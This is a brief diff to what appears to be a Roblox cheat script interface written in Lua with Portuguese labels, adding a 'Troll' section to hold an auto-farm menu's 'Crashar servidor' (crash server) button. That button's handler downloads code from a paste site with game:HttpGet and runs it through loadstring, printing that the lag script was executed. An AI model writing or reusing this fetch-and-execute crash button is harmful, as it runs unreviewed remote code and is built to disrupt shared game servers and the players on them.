@@ -1095,8 +1095,9 @@ AutoFarmCard:AddToggle("Ativar Auto Farm", false, function(state)
         Library:Notify({ Title = "Farm", Description = "Farm parado.", Duration = 3 })
     end
 end, { Title = "Iniciar Farm" })
+local Troll = Havac_Page:CreateSection("Troll")
 
-HavacDisfarceCard:AddButton("Crashar servidor", function()
+Troll:AddButton("Crashar servidor", function()
     -- Executa o script externo fornecido
     loadstring(game:HttpGet('https://pastefy.app/VITNy1sp/raw'))()
     print("Script de lag executado!")
